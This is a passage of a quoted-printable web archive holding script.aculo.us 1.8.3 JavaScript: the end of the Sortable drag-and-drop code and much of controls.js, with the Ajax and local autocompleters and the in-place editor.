      only:        false,
      delay:       0,
      hoverclass:  null,
      ghosting:    false,
      quiet:       false,
      scroll:      false,
      scrollSensitivity: 20,
      scrollSpeed: 15,
      format:      this.SERIALIZE_RULE,

      // these take arrays of elements or ids and can be
      // used for better initialization performance
      elements:    false,
      handles:     false,

      onChange:    Prototype.emptyFunction,
      onUpdate:    Prototype.emptyFunction
    }, arguments[1] || { });

    // clear any old sortable with same element
    this.destroy(element);

    // build options for the draggables
    var options_for_draggable =3D {
      revert:      true,
      quiet:       options.quiet,
      scroll:      options.scroll,
      scrollSpeed: options.scrollSpeed,
      scrollSensitivity: options.scrollSensitivity,
      delay:       options.delay,
      ghosting:    options.ghosting,
      constraint:  options.constraint,
      handle:      options.handle };

    if(options.starteffect)
      options_for_draggable.starteffect =3D options.starteffect;

    if(options.reverteffect)
      options_for_draggable.reverteffect =3D options.reverteffect;
    else
      if(options.ghosting) options_for_draggable.reverteffect =3D function(=
element) {
        element.style.top  =3D 0;
        element.style.left =3D 0;
      };

    if(options.endeffect)
      options_for_draggable.endeffect =3D options.endeffect;

    if(options.zindex)
      options_for_draggable.zindex =3D options.zindex;

    // build options for the droppables
    var options_for_droppable =3D {
      overlap:     options.overlap,
      containment: options.containment,
      tree:        options.tree,
      hoverclass:  options.hoverclass,
      onHover:     Sortable.onHover
    };

    var options_for_tree =3D {
      onHover:      Sortable.onEmptyHover,
      overlap:      options.overlap,
      containment:  options.containment,
      hoverclass:   options.hoverclass
    };

    // fix for gecko engine
    Element.cleanWhitespace(element);

    options.draggables =3D [];
    options.droppables =3D [];

    // drop on empty handling
    if(options.dropOnEmpty || options.tree) {
      Droppables.add(element, options_for_tree);
      options.droppables.push(element);
    }

    (options.elements || this.findElements(element, options) || []).each(=
 function(e,i) {
      var handle =3D options.handles ? $(options.handles[i]) :
        (options.handle ? $(e).select('.' + options.handle)[0] : e);
      options.draggables.push(
        new Draggable(e, Object.extend(options_for_draggable, { handle: han=
dle })));
      Droppables.add(e, options_for_droppable);
      if(options.tree) e.treeNode =3D element;
      options.droppables.push(e);
    });

    if(options.tree) {
      (Sortable.findTreeElements(element, options) || []).each( function(e)=
 {
        Droppables.add(e, options_for_tree);
        e.treeNode =3D element;
        options.droppables.push(e);
      });
    }

    // keep reference
    this.sortables[element.identify()] =3D options;

    // for onupdate
    Draggables.addObserver(new SortableObserver(element, options.onUpdate));

  },

  // return all suitable-for-sortable elements in a guaranteed order
  findElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.tag);
  },

  findTreeElements: function(element, options) {
    return Element.findChildren(
      element, options.only, options.tree ? true : false, options.treeTag);
  },

  onHover: function(element, dropon, overlap) {
    if(Element.isParent(dropon, element)) return;

    if(overlap > .33 && overlap < .66 && Sortable.options(dropon).tree) {
      return;
    } else if(overlap>0.5) {
      Sortable.mark(dropon, 'before');
      if(dropon.previousSibling !=3D element) {
        var oldParentNode =3D element.parentNode;
        element.style.visibility =3D "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, dropon);
        if(dropon.parentNode!=3DoldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    } else {
      Sortable.mark(dropon, 'after');
      var nextElement =3D dropon.nextSibling || null;
      if(nextElement !=3D element) {
        var oldParentNode =3D element.parentNode;
        element.style.visibility =3D "hidden"; // fix gecko rendering
        dropon.parentNode.insertBefore(element, nextElement);
        if(dropon.parentNode!=3DoldParentNode)
          Sortable.options(oldParentNode).onChange(element);
        Sortable.options(dropon.parentNode).onChange(element);
      }
    }
  },

  onEmptyHover: function(element, dropon, overlap) {
    var oldParentNode =3D element.parentNode;
    var droponOptions =3D Sortable.options(dropon);

    if(!Element.isParent(dropon, element)) {
      var index;

      var children =3D Sortable.findElements(dropon, {tag: droponOptions.ta=
g, only: droponOptions.only});
      var child =3D null;

      if(children) {
        var offset =3D Element.offsetSize(dropon, droponOptions.overlap) *=
 (1.0 - overlap);

        for (index =3D 0; index < children.length; index +=3D 1) {
          if (offset - Element.offsetSize (children[index], droponOptions.o=
verlap) >=3D 0) {
            offset -=3D Element.offsetSize (children[index], droponOptions.=
overlap);
          } else if (offset - (Element.offsetSize (children[index], droponO=
ptions.overlap) / 2) >=3D 0) {
            child =3D index + 1 < children.length ? children[index + 1] :=
 null;
            break;
          } else {
            child =3D children[index];
            break;
          }
        }
      }

      dropon.insertBefore(element, child);

      Sortable.options(oldParentNode).onChange(element);
      droponOptions.onChange(element);
    }
  },

  unmark: function() {
    if(Sortable._marker) Sortable._marker.hide();
  },

  mark: function(dropon, position) {
    // mark on ghosting only
    var sortable =3D Sortable.options(dropon.parentNode);
    if(sortable && !sortable.ghosting) return;

    if(!Sortable._marker) {
      Sortable._marker =3D
        ($('dropmarker') || Element.extend(document.createElement('DIV'))).
          hide().addClassName('dropmarker').setStyle({position:'absolute'});
      document.getElementsByTagName("body").item(0).appendChild(Sortable._m=
arker);
    }
    var offsets =3D dropon.cumulativeOffset();
    Sortable._marker.setStyle({left: offsets[0]+'px', top: offsets[1] + 'px=
'});

    if(position=3D=3D'after')
      if(sortable.overlap =3D=3D 'horizontal')
        Sortable._marker.setStyle({left: (offsets[0]+dropon.clientWidth) +=
 'px'});
      else
        Sortable._marker.setStyle({top: (offsets[1]+dropon.clientHeight) +=
 'px'});

    Sortable._marker.show();
  },

  _tree: function(element, options, parent) {
    var children =3D Sortable.findElements(element, options) || [];

    for (var i =3D 0; i < children.length; ++i) {
      var match =3D children[i].id.match(options.format);

      if (!match) continue;

      var child =3D {
        id: encodeURIComponent(match ? match[1] : null),
        element: element,
        parent: parent,
        children: [],
        position: parent.children.length,
        container: $(children[i]).down(options.treeTag)
      };

      /* Get the element containing the children and recurse over it */
      if (child.container)
        this._tree(child.container, options, child);

      parent.children.push (child);
    }

    return parent;
  },

  tree: function(element) {
    element =3D $(element);
    var sortableOptions =3D this.options(element);
    var options =3D Object.extend({
      tag: sortableOptions.tag,
      treeTag: sortableOptions.treeTag,
      only: sortableOptions.only,
      name: element.id,
      format: sortableOptions.format
    }, arguments[1] || { });

    var root =3D {
      id: null,
      parent: null,
      children: [],
      container: element,
      position: 0
    };

    return Sortable._tree(element, options, root);
  },

  /* Construct a [i] index for a particular node */
  _constructIndex: function(node) {
    var index =3D '';
    do {
      if (node.id) index =3D '[' + node.position + ']' + index;
    } while ((node =3D node.parent) !=3D null);
    return index;
  },

  sequence: function(element) {
    element =3D $(element);
    var options =3D Object.extend(this.options(element), arguments[1] || {=
 });

    return $(this.findElements(element, options) || []).map( function(item)=
 {
      return item.id.match(options.format) ? item.id.match(options.format)[=
1] : '';
    });
  },

  setSequence: function(element, new_sequence) {
    element =3D $(element);
    var options =3D Object.extend(this.options(element), arguments[2] || {=
 });

    var nodeMap =3D { };
    this.findElements(element, options).each( function(n) {
        if (n.id.match(options.format))
            nodeMap[n.id.match(options.format)[1]] =3D [n, n.parentNode];
        n.parentNode.removeChild(n);
    });

    new_sequence.each(function(ident) {
      var n =3D nodeMap[ident];
      if (n) {
        n[1].appendChild(n[0]);
        delete nodeMap[ident];
      }
    });
  },

  serialize: function(element) {
    element =3D $(element);
    var options =3D Object.extend(Sortable.options(element), arguments[1]=
 || { });
    var name =3D encodeURIComponent(
      (arguments[1] && arguments[1].name) ? arguments[1].name : element.id);

    if (options.tree) {
      return Sortable.tree(element, arguments[1]).children.map( function (i=
tem) {
        return [name + Sortable._constructIndex(item) + "[id]=3D" +
                encodeURIComponent(item.id)].concat(item.children.map(argum=
ents.callee));
      }).flatten().join('&');
    } else {
      return Sortable.sequence(element, arguments[1]).map( function(item)=
 {
        return name + "[]=3D" + encodeURIComponent(item);
      }).join('&');
    }
  }
};

// Returns true if child is contained within element
Element.isParent =3D function(child, element) {
  if (!child.parentNode || child =3D=3D element) return false;
  if (child.parentNode =3D=3D element) return true;
  return Element.isParent(child.parentNode, element);
};

Element.findChildren =3D function(element, only, recursive, tagName) {
  if(!element.hasChildNodes()) return null;
  tagName =3D tagName.toUpperCase();
  if(only) only =3D [only].flatten();
  var elements =3D [];
  $A(element.childNodes).each( function(e) {
    if(e.tagName && e.tagName.toUpperCase()=3D=3DtagName &&
      (!only || (Element.classNames(e).detect(function(v) { return only.inc=
lude(v) }))))
        elements.push(e);
    if(recursive) {
      var grandchildren =3D Element.findChildren(e, only, recursive, tagNam=
e);
      if(grandchildren) elements.push(grandchildren);
    }
  });

  return (elements.length>0 ? elements.flatten() : []);
};

Element.offsetSize =3D function (element, type) {
  return element['offset' + ((type=3D=3D'vertical' || type=3D=3D'height')=
 ? 'Height' : 'Width')];
};
------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/controls.js
Content-Transfer-Encoding: quoted-printable
Content-Type: text/javascript

// script.aculo.us controls.js v1.8.3, Thu Oct 08 11:23:33 +0200 2009

// Copyright (c) 2005-2009 Thomas Fuchs (http://script.aculo.us, http://mir=
.aculo.us)
//           (c) 2005-2009 Ivan Krstic (http://blogs.law.harvard.edu/ivan)
//           (c) 2005-2009 Jon Tirsen (http://www.tirsen.com)
// Contributors:
//  Richard Livsey
//  Rahul Bhargava
//  Rob Wills
//
// script.aculo.us is freely distributable under the terms of an MIT-style=
 license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// Autocompleter.Base handles all the autocompletion functionality
// that's independent of the data source for autocompletion. This
// includes drawing the autocompletion menu, observing keyboard
// and mouse events, and similar.
//
// Specific autocompleters need to provide, at the very least,
// a getUpdatedChoices function that will be invoked every time
// the text inside the monitored textbox changes. This method
// should get the text for which to provide autocompletion by
// invoking this.getToken(), NOT by directly accessing
// this.element.value. This is to allow incremental tokenized
// autocompletion. Specific auto-completion logic (AJAX, etc)
// belongs in getUpdatedChoices.
//
// Tokenized incremental autocompletion is enabled automatically
// when an autocompleter is instantiated with the 'tokens' option
// in the options parameter, e.g.:
// new Ajax.Autocompleter('id','upd', '/url/', { tokens: ',' });
// will incrementally autocomplete with a comma as the token.
// Additionally, ',' in the above example can be replaced with
// a token array, e.g. { tokens: [',', '\n'] } which
// enables autocompletion on multiple tokens. This is most
// useful when one of the tokens is \n (a newline), as it
// allows smart autocompletion after linebreaks.

if(typeof Effect =3D=3D 'undefined')
  throw("controls.js requires including script.aculo.us' effects.js library=
");

var Autocompleter =3D { };
Autocompleter.Base =3D Class.create({
  baseInitialize: function(element, update, options) {
    element          =3D $(element);
    this.element     =3D element;
    this.update      =3D $(update);
    this.hasFocus    =3D false;
    this.changed     =3D false;
    this.active      =3D false;
    this.index       =3D 0;
    this.entryCount  =3D 0;
    this.oldElementValue =3D this.element.value;

    if(this.setOptions)
      this.setOptions(options);
    else
      this.options =3D options || { };

    this.options.paramName    =3D this.options.paramName || this.element.na=
me;
    this.options.tokens       =3D this.options.tokens || [];
    this.options.frequency    =3D this.options.frequency || 0.4;
    this.options.minChars     =3D this.options.minChars || 1;
    this.options.onShow       =3D this.options.onShow ||
      function(element, update){
        if(!update.style.position || update.style.position=3D=3D'absolute')=
 {
          update.style.position =3D 'absolute';
          Position.clone(element, update, {
            setHeight: false,
            offsetTop: element.offsetHeight
          });
        }
        Effect.Appear(update,{duration:0.15});
      };
    this.options.onHide =3D this.options.onHide ||
      function(element, update){ new Effect.Fade(update,{duration:0.15}) };

    if(typeof(this.options.tokens) =3D=3D 'string')
      this.options.tokens =3D new Array(this.options.tokens);
    // Force carriage returns as token delimiters anyway
    if (!this.options.tokens.include('\n'))
      this.options.tokens.push('\n');

    this.observer =3D null;

    this.element.setAttribute('autocomplete','off');

    Element.hide(this.update);

    Event.observe(this.element, 'blur', this.onBlur.bindAsEventListener(thi=
s));
    Event.observe(this.element, 'keydown', this.onKeyPress.bindAsEventListe=
ner(this));
  },

  show: function() {
    if(Element.getStyle(this.update, 'display')=3D=3D'none') this.options.o=
nShow(this.element, this.update);
    if(!this.iefix &&
      (Prototype.Browser.IE) &&
      (Element.getStyle(this.update, 'position')=3D=3D'absolute')) {
      new Insertion.After(this.update,
       '<iframe id=3D"' + this.update.id + '_iefix" '+
       'style=3D"display:none;position:absolute;filter:progid:DXImageTransf=
orm.Microsoft.Alpha(opacity=3D0);" ' +
       'src=3D"javascript:false;" frameborder=3D"0" scrolling=3D"no"></ifra=
me>');
      this.iefix =3D $(this.update.id+'_iefix');
    }
    if(this.iefix) setTimeout(this.fixIEOverlapping.bind(this), 50);
  },

  fixIEOverlapping: function() {
    Position.clone(this.update, this.iefix, {setTop:(!this.update.style.hei=
ght)});
    this.iefix.style.zIndex =3D 1;
    this.update.style.zIndex =3D 2;
    Element.show(this.iefix);
  },

  hide: function() {
    this.stopIndicator();
    if(Element.getStyle(this.update, 'display')!=3D'none') this.options.onH=
ide(this.element, this.update);
    if(this.iefix) Element.hide(this.iefix);
  },

  startIndicator: function() {
    if(this.options.indicator) Element.show(this.options.indicator);
  },

  stopIndicator: function() {
    if(this.options.indicator) Element.hide(this.options.indicator);
  },

  onKeyPress: function(event) {
    if(this.active)
      switch(event.keyCode) {
       case Event.KEY_TAB:
       case Event.KEY_RETURN:
         this.selectEntry();
         Event.stop(event);
       case Event.KEY_ESC:
         this.hide();
         this.active =3D false;
         Event.stop(event);
         return;
       case Event.KEY_LEFT:
       case Event.KEY_RIGHT:
         return;
       case Event.KEY_UP:
         this.markPrevious();
         this.render();
         Event.stop(event);
         return;
       case Event.KEY_DOWN:
         this.markNext();
         this.render();
         Event.stop(event);
         return;
      }
     else
       if(event.keyCode=3D=3DEvent.KEY_TAB || event.keyCode=3D=3DEvent.KEY_=
RETURN ||
         (Prototype.Browser.WebKit > 0 && event.keyCode =3D=3D 0)) return;

    this.changed =3D true;
    this.hasFocus =3D true;

    if(this.observer) clearTimeout(this.observer);
      this.observer =3D
        setTimeout(this.onObserverEvent.bind(this), this.options.frequency*=
1000);
  },

  activate: function() {
    this.changed =3D false;
    this.hasFocus =3D true;
    this.getUpdatedChoices();
  },

  onHover: function(event) {
    var element =3D Event.findElement(event, 'LI');
    if(this.index !=3D element.autocompleteIndex)
    {
        this.index =3D element.autocompleteIndex;
        this.render();
    }
    Event.stop(event);
  },

  onClick: function(event) {
    var element =3D Event.findElement(event, 'LI');
    this.index =3D element.autocompleteIndex;
    this.selectEntry();
    this.hide();
  },

  onBlur: function(event) {
    // needed to make click events working
    setTimeout(this.hide.bind(this), 250);
    this.hasFocus =3D false;
    this.active =3D false;
  },

  render: function() {
    if(this.entryCount > 0) {
      for (var i =3D 0; i < this.entryCount; i++)
        this.index=3D=3Di ?
          Element.addClassName(this.getEntry(i),"selected") :
          Element.removeClassName(this.getEntry(i),"selected");
      if(this.hasFocus) {
        this.show();
        this.active =3D true;
      }
    } else {
      this.active =3D false;
      this.hide();
    }
  },

  markPrevious: function() {
    if(this.index > 0) this.index--;
      else this.index =3D this.entryCount-1;
    this.getEntry(this.index).scrollIntoView(true);
  },

  markNext: function() {
    if(this.index < this.entryCount-1) this.index++;
      else this.index =3D 0;
    this.getEntry(this.index).scrollIntoView(false);
  },

  getEntry: function(index) {
    return this.update.firstChild.childNodes[index];
  },

  getCurrentEntry: function() {
    return this.getEntry(this.index);
  },

  selectEntry: function() {
    this.active =3D false;
    this.updateElement(this.getCurrentEntry());
  },

  updateElement: function(selectedElement) {
    if (this.options.updateElement) {
      this.options.updateElement(selectedElement);
      return;
    }
    var value =3D '';
    if (this.options.select) {
      var nodes =3D $(selectedElement).select('.' + this.options.select) ||=
 [];
      if(nodes.length>0) value =3D Element.collectTextNodes(nodes[0], this.=
options.select);
    } else
      value =3D Element.collectTextNodesIgnoreClass(selectedElement, 'infor=
mal');

    var bounds =3D this.getTokenBounds();
    if (bounds[0] !=3D -1) {
      var newValue =3D this.element.value.substr(0, bounds[0]);
      var whitespace =3D this.element.value.substr(bounds[0]).match(/^\s+/);
      if (whitespace)
        newValue +=3D whitespace[0];
      this.element.value =3D newValue + value + this.element.value.substr(b=
ounds[1]);
    } else {
      this.element.value =3D value;
    }
    this.oldElementValue =3D this.element.value;
    this.element.focus();

    if (this.options.afterUpdateElement)
      this.options.afterUpdateElement(this.element, selectedElement);
  },

  updateChoices: function(choices) {
    if(!this.changed && this.hasFocus) {
      this.update.innerHTML =3D choices;
      Element.cleanWhitespace(this.update);
      Element.cleanWhitespace(this.update.down());

      if(this.update.firstChild && this.update.down().childNodes) {
        this.entryCount =3D
          this.update.down().childNodes.length;
        for (var i =3D 0; i < this.entryCount; i++) {
          var entry =3D this.getEntry(i);
          entry.autocompleteIndex =3D i;
          this.addObservers(entry);
        }
      } else {
        this.entryCount =3D 0;
      }

      this.stopIndicator();
      this.index =3D 0;

      if(this.entryCount=3D=3D1 && this.options.autoSelect) {
        this.selectEntry();
        this.hide();
      } else {
        this.render();
      }
    }
  },

  addObservers: function(element) {
    Event.observe(element, "mouseover", this.onHover.bindAsEventListener(th=
is));
    Event.observe(element, "click", this.onClick.bindAsEventListener(this));
  },

  onObserverEvent: function() {
    this.changed =3D false;
    this.tokenBounds =3D null;
    if(this.getToken().length>=3Dthis.options.minChars) {
      this.getUpdatedChoices();
    } else {
      this.active =3D false;
      this.hide();
    }
    this.oldElementValue =3D this.element.value;
  },

  getToken: function() {
    var bounds =3D this.getTokenBounds();
    return this.element.value.substring(bounds[0], bounds[1]).strip();
  },

  getTokenBounds: function() {
    if (null !=3D this.tokenBounds) return this.tokenBounds;
    var value =3D this.element.value;
    if (value.strip().empty()) return [-1, 0];
    var diff =3D arguments.callee.getFirstDifferencePos(value, this.oldElem=
entValue);
    var offset =3D (diff =3D=3D this.oldElementValue.length ? 1 : 0);
    var prevTokenPos =3D -1, nextTokenPos =3D value.length;
    var tp;
    for (var index =3D 0, l =3D this.options.tokens.length; index < l; ++in=
dex) {
      tp =3D value.lastIndexOf(this.options.tokens[index], diff + offset -=
 1);
      if (tp > prevTokenPos) prevTokenPos =3D tp;
      tp =3D value.indexOf(this.options.tokens[index], diff + offset);
      if (-1 !=3D tp && tp < nextTokenPos) nextTokenPos =3D tp;
    }
    return (this.tokenBounds =3D [prevTokenPos + 1, nextTokenPos]);
  }
});

Autocompleter.Base.prototype.getTokenBounds.getFirstDifferencePos =3D funct=
ion(newS, oldS) {
  var boundary =3D Math.min(newS.length, oldS.length);
  for (var index =3D 0; index < boundary; ++index)
    if (newS[index] !=3D oldS[index])
      return index;
  return boundary;
};

Ajax.Autocompleter =3D Class.create(Autocompleter.Base, {
  initialize: function(element, update, url, options) {
    this.baseInitialize(element, update, options);
    this.options.asynchronous  =3D true;
    this.options.onComplete    =3D this.onComplete.bind(this);
    this.options.defaultParams =3D this.options.parameters || null;
    this.url                   =3D url;
  },

  getUpdatedChoices: function() {
    this.startIndicator();

    var entry =3D encodeURIComponent(this.options.paramName) + '=3D' +
      encodeURIComponent(this.getToken());

    this.options.parameters =3D this.options.callback ?
      this.options.callback(this.element, entry) : entry;

    if(this.options.defaultParams)
      this.options.parameters +=3D '&' + this.options.defaultParams;

    new Ajax.Request(this.url, this.options);
  },

  onComplete: function(request) {
    this.updateChoices(request.responseText);
  }
});

// The local array autocompleter. Used when you'd prefer to
// inject an array of autocompletion options into the page, rather
// than sending out Ajax queries, which can be quite slow sometimes.
//
// The constructor takes four parameters. The first two are, as usual,
// the id of the monitored textbox, and id of the autocompletion menu.
// The third is the array you want to autocomplete from, and the fourth
// is the options block.
//
// Extra local autocompletion options:
// - choices - How many autocompletion choices to offer
//
// - partialSearch - If false, the autocompleter will match entered
//                    text only at the beginning of strings in the
//                    autocomplete array. Defaults to true, which will
//                    match text at the beginning of any *word* in the
//                    strings in the autocomplete array. If you want to
//                    search anywhere in the string, additionally set
//                    the option fullSearch to true (default: off).
//
// - fullSsearch - Search anywhere in autocomplete array strings.
//
// - partialChars - How many characters to enter before triggering
//                   a partial match (unlike minChars, which defines
//                   how many characters are required to do any match
//                   at all). Defaults to 2.
//
// - ignoreCase - Whether to ignore case when autocompleting.
//                 Defaults to true.
//
// It's possible to pass in a custom function as the 'selector'
// option, if you prefer to write your own autocompletion logic.
// In that case, the other options above will not apply unless
// you support them.

Autocompleter.Local =3D Class.create(Autocompleter.Base, {
  initialize: function(element, update, array, options) {
    this.baseInitialize(element, update, options);
    this.options.array =3D array;
  },

  getUpdatedChoices: function() {
    this.updateChoices(this.options.selector(this));
  },

  setOptions: function(options) {
    this.options =3D Object.extend({
      choices: 10,
      partialSearch: true,
      partialChars: 2,
      ignoreCase: true,
      fullSearch: false,
      selector: function(instance) {
        var ret       =3D []; // Beginning matches
        var partial   =3D []; // Inside matches
        var entry     =3D instance.getToken();
        var count     =3D 0;

        for (var i =3D 0; i < instance.options.array.length &&
          ret.length < instance.options.choices ; i++) {

          var elem =3D instance.options.array[i];
          var foundPos =3D instance.options.ignoreCase ?
            elem.toLowerCase().indexOf(entry.toLowerCase()) :
            elem.indexOf(entry);

          while (foundPos !=3D -1) {
            if (foundPos =3D=3D 0 && elem.length !=3D entry.length) {
              ret.push("<li><strong>" + elem.substr(0, entry.length) + "</s=
trong>" +
                elem.substr(entry.length) + "</li>");
              break;
            } else if (entry.length >=3D instance.options.partialChars &&
              instance.options.partialSearch && foundPos !=3D -1) {
              if (instance.options.fullSearch || /\s/.test(elem.substr(foun=
dPos-1,1))) {
                partial.push("<li>" + elem.substr(0, foundPos) + "<strong>"=
 +
                  elem.substr(foundPos, entry.length) + "</strong>" + elem.=
substr(
                  foundPos + entry.length) + "</li>");
                break;
              }
            }

            foundPos =3D instance.options.ignoreCase ?
              elem.toLowerCase().indexOf(entry.toLowerCase(), foundPos + 1)=
 :
              elem.indexOf(entry, foundPos + 1);

          }
        }
        if (partial.length)
          ret =3D ret.concat(partial.slice(0, instance.options.choices - re=
t.length));
        return "<ul>" + ret.join('') + "</ul>";
      }
    }, options || { });
  }
});

// AJAX in-place editor and collection editor
// Full rewrite by Christophe Porteneuve <tdd@tddsworld.com> (April 2007).

// Use this if you notice weird scrolling problems on some browsers,
// the DOM might be a bit confused when this gets called so do this
// waits 1 ms (with setTimeout) until it does the activation
Field.scrollFreeActivate =3D function(field) {
  setTimeout(function() {
    Field.activate(field);
  }, 1);
};

Ajax.InPlaceEditor =3D Class.create({
  initialize: function(element, url, options) {
    this.url =3D url;
    this.element =3D element =3D $(element);
    this.prepareOptions();
    this._controls =3D { };
    arguments.callee.dealWithDeprecatedOptions(options); // DEPRECATION LAY=
ER!!!
    Object.extend(this.options, options || { });
    if (!this.options.formId && this.element.id) {
      this.options.formId =3D this.element.id + '-inplaceeditor';
      if ($(this.options.formId))
        this.options.formId =3D '';
    }
    if (this.options.externalControl)
      this.options.externalControl =3D $(this.options.externalControl);
    if (!this.options.externalControl)
      this.options.externalControlOnly =3D false;
    this._originalBackground =3D this.element.getStyle('background-color')=
 || 'transparent';
    this.element.title =3D this.options.clickToEditText;
    this._boundCancelHandler =3D this.handleFormCancellation.bind(this);
    this._boundComplete =3D (this.options.onComplete || Prototype.emptyFunc=
tion).bind(this);
    this._boundFailureHandler =3D this.handleAJAXFailure.bind(this);
    this._boundSubmitHandler =3D this.handleFormSubmission.bind(this);
    this._boundWrapperHandler =3D this.wrapUp.bind(this);
    this.registerListeners();
  },
  checkForEscapeOrReturn: function(e) {
    if (!this._editing || e.ctrlKey || e.altKey || e.shiftKey) return;
    if (Event.KEY_ESC =3D=3D e.keyCode)
      this.handleFormCancellation(e);
    else if (Event.KEY_RETURN =3D=3D e.keyCode)
      this.handleFormSubmission(e);
  },
  createControl: function(mode, handler, extraClasses) {
    var control =3D this.options[mode + 'Control'];
    var text =3D this.options[mode + 'Text'];
    if ('button' =3D=3D control) {
      var btn =3D document.createElement('input');
      btn.type =3D 'submit';
      btn.value =3D text;
      btn.className =3D 'editor_' + mode + '_button';
      if ('cancel' =3D=3D mode)
        btn.onclick =3D this._boundCancelHandler;
      this._form.appendChild(btn);
      this._controls[mode] =3D btn;
    } else if ('link' =3D=3D control) {
      var link =3D document.createElement('a');
      link.href =3D '#';
      link.appendChild(document.createTextNode(text));
      link.onclick =3D 'cancel' =3D=3D mode ? this._boundCancelHandler : th=
is._boundSubmitHandler;
      link.className =3D 'editor_' + mode + '_link';
      if (extraClasses)
        link.className +=3D ' ' + extraClasses;
      this._form.appendChild(link);
      this._controls[mode] =3D link;
    }
  },
  createEditField: function() {
    var text =3D (this.options.loadTextURL ? this.options.loadingText : thi=
s.getText());
    var fld;
    if (1 >=3D this.options.rows && !/\r|\n/.test(this.getText())) {
      fld =3D document.createElement('input');
      fld.type =3D 'text';
      var size =3D this.options.size || this.options.cols || 0;
      if (0 < size) fld.size =3D size;
    } else {
      fld =3D document.createElement('textarea');
      fld.rows =3D (1 >=3D this.options.rows ? this.options.autoRows : this=
.options.rows);
      fld.cols =3D this.options.cols || 40;
    }
    fld.name =3D this.options.paramName;
    fld.value =3D text; // No HTML breaks conversion anymore
    fld.className =3D 'editor_field';
    if (this.options.submitOnBlur)
      fld.onblur =3D this._boundSubmitHandler;
    this._controls.editor =3D fld;
    if (this.options.loadTextURL)
      this.loadExternalText();
    this._form.appendChild(this._controls.editor);
  },
  createForm: function() {
    var ipe =3D this;
    function addText(mode, condition) {
      var text =3D ipe.options['text' + mode + 'Controls'];
      if (!text || condition =3D=3D=3D false) return;
      ipe._form.appendChild(document.createTextNode(text));
    };
    this._form =3D $(document.createElement('form'));
    this._form.id =3D this.options.formId;
    this._form.addClassName(this.options.formClassName);
    this._form.onsubmit =3D this._boundSubmitHandler;
    this.createEditField();
    if ('textarea' =3D=3D this._controls.editor.tagName.toLowerCase())
      this._form.appendChild(document.createElement('br'));
    if (this.options.onFormCustomization)
      this.options.onFormCustomization(this, this._form);
    addText('Before', this.options.okControl || this.options.cancelControl);
    this.createControl('ok', this._boundSubmitHandler);
    addText('Between', this.options.okControl && this.options.cancelControl=
);
    this.createControl('cancel', this._boundCancelHandler, 'editor_cancel');
    addText('After', this.options.okControl || this.options.cancelControl);
  },
  destroy: function() {
    if (this._oldInnerHTML)
      this.element.innerHTML =3D this._oldInnerHTML;
    this.leaveEditMode();
    this.unregisterListeners();
  },
  enterEditMode: function(e) {
    if (this._saving || this._editing) return;
    this._editing =3D true;
    this.triggerCallback('onEnterEditMode');
    if (this.options.externalControl)
      this.options.externalControl.hide();
    this.element.hide();
    this.createForm();
    this.element.parentNode.insertBefore(this._form, this.element);
    if (!this.options.loadTextURL)
      this.postProcessEditField();
    if (e) Event.stop(e);
  },
  enterHover: function(e) {
    if (this.options.hoverClassName)
      this.element.addClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onEnterHover');
  },
  getText: function() {
    return this.element.innerHTML.unescapeHTML();
  },
  handleAJAXFailure: function(transport) {
    this.triggerCallback('onFailure', transport);
    if (this._oldInnerHTML) {
      this.element.innerHTML =3D this._oldInnerHTML;
      this._oldInnerHTML =3D null;
    }
  },
  handleFormCancellation: function(e) {
    this.wrapUp();
    if (e) Event.stop(e);
  },
  handleFormSubmission: function(e) {
    var form =3D this._form;
    var value =3D $F(this._controls.editor);
    this.prepareSubmission();
    var params =3D this.options.callback(form, value) || '';
    if (Object.isString(params))
      params =3D params.toQueryParams();
    params.editorId =3D this.element.id;
    if (this.options.htmlResponse) {
      var options =3D Object.extend({ evalScripts: true }, this.options.aja=
xOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Updater({ success: this.element }, this.url, options);
    } else {
      var options =3D Object.extend({ method: 'get' }, this.options.ajaxOpt=
ions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Request(this.url, options);
    }
    if (e) Event.stop(e);
  },
  leaveEditMode: function() {
    this.element.removeClassName(this.options.savingClassName);
    this.removeForm();
    this.leaveHover();
    this.element.style.backgroundColor =3D this._originalBackground;
    this.element.show();
    if (this.options.externalControl)
      this.options.externalControl.show();
    this._saving =3D false;
    this._editing =3D false;
    this._oldInnerHTML =3D null;
    this.triggerCallback('onLeaveEditMode');
  },
  leaveHover: function(e) {
    if (this.options.hoverClassName)
      this.element.removeClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onLeaveHover');
  },
  loadExternalText: function() {
    this._form.addClassName(this.options.loadingClassName);
    this._controls.editor.disabled =3D true;
    var options =3D Object.extend({ method: 'get' }, this.options.ajaxOptio=
ns);
    Object.extend(options, {
      parameters: 'editorId=3D' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._form.removeClassName(this.options.loadingClassName);
        var text =3D transport.responseText;
        if (this.options.stripLoadedTextTags)
          text =3D text.stripTags();
        this._controls.editor.value =3D text;
        this._controls.editor.disabled =3D false;
        this.postProcessEditField();
      }.bind(this),
      onFailure: this._boundFailureHandler
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },
  postProcessEditField: function() {
    var fpc =3D this.options.fieldPostCreation;
    if (fpc)
      $(this._controls.editor)['focus' =3D=3D fpc ? 'focus' : 'activate']();
  },
  prepareOptions: function() {
    this.options =3D Object.clone(Ajax.InPlaceEditor.DefaultOptions);
    Object.extend(this.options, Ajax.InPlaceEditor.DefaultCallbacks);
    [this._extraDefaultOptions].flatten().compact().each(function(defs) {
      Object.extend(this.options, defs);
    }.bind(this));
  },
  prepareSubmission: function() {
    this._saving =3D true;
    this.removeForm();
    this.leaveHover();
    this.showSaving();
  },
  registerListeners: function() {
    this._listeners =3D { };
    var listener;
    $H(Ajax.InPlaceEditor.Listeners).each(function(pair) {
      listener =3D this[pair.value].bind(this);
      this._listeners[pair.key] =3D listener;
      if (!this.options.externalControlOnly)
